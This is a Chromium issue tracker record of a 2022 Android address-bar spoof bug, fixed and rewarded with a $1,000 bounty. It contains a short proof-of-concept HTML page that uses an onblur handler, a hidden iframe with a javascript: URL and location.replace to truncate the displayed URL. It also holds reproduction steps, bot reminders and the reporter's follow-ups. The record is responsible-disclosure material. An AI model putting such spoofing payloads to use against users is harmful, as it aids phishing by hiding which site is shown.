# Spoof omnibar

| Field | Value |
|-------|-------|
| **Issue ID** | [40058766](https://issues.chromium.org/issues/40058766) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Omnibox |
| **Platforms** | Android |
| **Reporter** | li...@gmail.com |
| **Assignee** | ct...@chromium.org |
| **Created** | 2022-02-13 |
| **Bounty** | $1,000.00 |

## Description

Steps to reproduce the problem:
Visit http://lijoatppr.000webhostapp.com/spoof/1.html
Omnibar spoof. Only shows 4 character of url also omnibar will freeze

What is the expected behavior?
Shows original url

What went wrong?
Omnibar elide to 4 character also freeze 

Attaching video and html

<!DOCTYPE HTML>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no">
<title>Script injection</title>

<style>
iframe {
visibility: hidden;
}
</style>

<script>

window.onblur = function() {
document.getElementById("iframe").src = "javascript:alert('Spoof');";
location.replace("https://stackoverflow.com");
}
</script>
</head>

<body>
   <center>
<br>
</center>
   <iframe id="iframe"></iframe>
</body>

</html>

Did this work before? N/A 

Chrome version: 98.0.4758.87  Channel: stable
OS Version:

## Attachments

- [Record_2022-02-13-22-58-16.mp4](attachments/Record_2022-02-13-22-58-16.mp4) (video/mp4, 7.7 MB)
- [WhatsApp Video 2023-10-23 at 9.27.17 PM.mp4](attachments/WhatsApp Video 2023-10-23 at 9.27.17 PM.mp4) (video/mp4, 3.0 MB)

## Timeline

### [Deleted User] (2022-02-13)

[Empty comment from Monorail migration]

### ad...@google.com (2022-02-14)

Thanks for the report.

I can reproduce the truncated URI in the Omnibox on Android 98.0.4758.87.

A note for other reproducers: I was able to reproduce this by:
1. Copy and paste the above snippet into a local html file
2. Run python3 -m http.server
3. Connect over http
4. After the page has loaded, you need to do something (e.g. tap on the omnibox) presumably to trigger the onBlur
5. Tap OK on the alert
6. Then you see the truncated URI

As an address bar spoof with limited freedom/flexibility, I'm rating this as Medium severity (https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md#toc-medium-severity) though this may get reduced to Low on further consideration as it involves some UI interaction and a few specific steps.

cthomp@, would you please figure out the right person to take a look at this? Thanks!

[Monorail components: UI>Browser>Omnibox]

### [Deleted User] (2022-02-14)

[Empty comment from Monorail migration]

### [Deleted User] (2022-02-14)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-02-14)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-02-14)

[Empty comment from Monorail migration]

### [Deleted User] (2022-02-28)

cthomp: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-10)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-21)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### li...@gmail.com (2022-04-12)

Hi any upates for this Medium Severity bug???

### li...@gmail.com (2022-05-05)

Hi,
Any updates.

### [Deleted User] (2022-05-25)

[Empty comment from Monorail migration]

### th...@chromium.org (2022-06-10)

Security marshal here. cthomp@, do you know who would be a good owner for this ticket?

### ct...@chromium.org (2022-06-11)

Looping in Omnibox folks as I haven't had cycles to investigate this -- +tommycli@ any ideas about what's going wrong here?

### [Deleted User] (2022-07-12)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-22)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-08-01)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-08-03)

[Empty comment from Monorail migration]

### li...@gmail.com (2022-08-05)

Hi,
Any updates.

### [Deleted User] (2022-09-07)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-09-19)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-09-28)

[Empty comment from Monorail migration]

### li...@gmail.com (2022-10-25)

Respected sir any updates?

### [Deleted User] (2022-11-25)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-02)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### li...@gmail.com (2023-01-05)

[Comment Deleted]

### [Deleted User] (2023-02-08)

[Empty comment from Monorail migration]

### li...@gmail.com (2023-03-14)

Hi,
Any updates.

### [Deleted User] (2023-04-05)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-31)

[Empty comment from Monorail migration]

### li...@gmail.com (2023-06-01)

Hi,
Any updates.

### [Deleted User] (2023-08-01)

This issue has not been updated for 60 or more days - lowering its priority to P2.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-08-16)

[Empty comment from Monorail migration]

### [Deleted User] (2023-10-11)

[Empty comment from Monorail migration]

### li...@gmail.com (2023-10-23)

[Comment Deleted]

### li...@gmail.com (2023-10-23)

Sir

It's fixed and the behavior changed correctly. Now omnibar shows correctly. don't add another milestone tag make fixed. and reward tag. I attaching canary 120 video above for proof. cthomp@chromium.org, tommycli@chromium.org

### li...@gmail.com (2023-10-23)

[Empty comment from Monorail migration]

### li...@gmail.com (2023-10-23)

Sir,

Another similar issues which is fixed and given bounties got published 1370705, 1404621. Please make comments here to know something is happening.

### li...@gmail.com (2023-10-24)

Sir,

adetaylor@google.com as your https://crbug.com/chromium/1296928#c2 you assigned cthomp@chromium.org and https://crbug.com/chromium/1296928#c15 cthomp@chromium.org made 	tommycli@chromium.org as owner. there after no response per https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md and https://crbug.com/chromium/1296928#c5 it was Security_Severity-Medium and pri 2 bug and i checked it it's seems fixed. https://crbug.com/chromium/1370705, 1404621 after this fixed and reward paid so expecting replay.

### li...@gmail.com (2023-11-01)

Mam,

amyressler@chromium.org please look omnibar spoof  which is reported Feb 13, 2022 before  https://crbug.com/chromium/1370705, 1404621. it was Security_Severity-Medium and pri 2 bug and i checked it it's seems fixed read https://crbug.com/chromium/1296928#c41 mam expecting reply from your end. A bughunter started hunting fixed bugs https://crbug.com/chromium/1015787, https://crbug.com/chromium/1207007, https://crbug.com/chromium/1024190 many more and helped to improve chrome i think. But this i think i met the goal for bounty but no response for a long time. 

adetaylor@google.com,  cthomp@chromium.org, tommycli@chromium.org




### ct...@chromium.org (2023-11-02)

Sorry for the lack of updates on this bug, and thanks for the followup in https://crbug.com/chromium/1296928#c38 and https://crbug.com/chromium/1296928#c39. This does appear to be fixed now, as the navigation to the target URL does not trigger (and does not replace the URL shown in the Omnibox) until after the JavaScript alert is dismissed, so closing this bug out.

### li...@gmail.com (2023-11-03)

[Comment Deleted]

### [Deleted User] (2023-11-03)

[Empty comment from Monorail migration]

### [Deleted User] (2023-11-03)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-11-06)

Hello, apologies for the lack of response to the above comments. Please be aware that tagging us in a comment does not notify of an issue, and we aren't able to monitor all ongoing work or closed security bugs. If you need a response to a security bug in the future, please reach out to security-vrp@chromium.org. 

In the meantime, the reward-topanel label has been applied by the bot and this will be reviewed in VRP Panel assessment at a forthcoming panel session. 
Thank you for your patience. 

### am...@google.com (2023-11-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-11-09)

Congratulations! The Chrome VRP Panel has decided to award you $1,000 for this report. A member of our finance team will be in touch with you soon to arrange payment. Thank you for your efforts and reporting this issue to us!

### am...@google.com (2023-11-11)

[Empty comment from Monorail migration]

### li...@gmail.com (2023-11-11)

Thanks for the reward!

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1296928?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-02-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058766)*
